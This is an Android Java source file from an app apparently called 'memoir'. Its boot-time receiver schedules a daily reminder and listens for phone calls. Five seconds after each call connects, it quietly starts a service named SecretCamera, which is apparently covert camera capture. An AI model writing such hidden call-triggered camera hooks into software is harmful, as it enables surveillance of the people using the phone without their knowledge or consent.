package com.krystal.memoir;

import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.krystal.memoir.services.ReminderService;
import com.krystal.memoir.services.SecretCamera;

public class BootupBroadcastReceiver extends BroadcastReceiver {

	private TelephonyManager mTelephonyManager = null;
	private static Context mContext = null;
	private SharedPreferences mPrefs = null;

	private static PhoneStateListener mPhoneListener = new PhoneStateListener() {
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING:
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:
					Handler handler = new Handler();
					handler.postDelayed(new Runnable() {

						@Override
						public void run() {
							Intent intent = new Intent(mContext,
									SecretCamera.class);
							mContext.startService(intent);
						}
					}, 5000);
					break;
				case TelephonyManager.CALL_STATE_IDLE:
					break;
				default:
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	};

	@Override
	public void onReceive(Context context, Intent arg1) {
		mContext = context;
		if (mTelephonyManager == null) {
			mTelephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			mTelephonyManager.listen(mPhoneListener,
					PhoneStateListener.LISTEN_NONE);
			mTelephonyManager.listen(mPhoneListener,
					PhoneStateListener.LISTEN_CALL_STATE);
		}

		mPrefs = context.getSharedPreferences("com.krystal.memoir",
				Context.MODE_PRIVATE);

		String remiderTime = mPrefs.getString(
				"com.krystal.memoir.reminderTime", null);
		if (remiderTime != null) {
			long hofd = Long.parseLong(remiderTime.substring(0,
					remiderTime.indexOf(":")));
			long min = Long.parseLong(remiderTime.substring(remiderTime
					.indexOf(":") + 1));
			//Log.d("asd", "Setting reminder " + hofd + " min=" + min);
			Calendar c = Calendar.getInstance();
			int currHofd = c.get(Calendar.HOUR_OF_DAY);
			int currMin = c.get(Calendar.MINUTE);

			AlarmManager am = (AlarmManager) context
					.getSystemService(Context.ALARM_SERVICE);
			Intent i = new Intent(context, ReminderService.class);
			PendingIntent pi = PendingIntent.getService(context, 0, i, 0);
			am.setRepeating(AlarmManager.RTC, System.currentTimeMillis() + (((hofd - currHofd)*60) + min - currMin)*60*1000, AlarmManager.INTERVAL_DAY, pi);
		}
	}
}
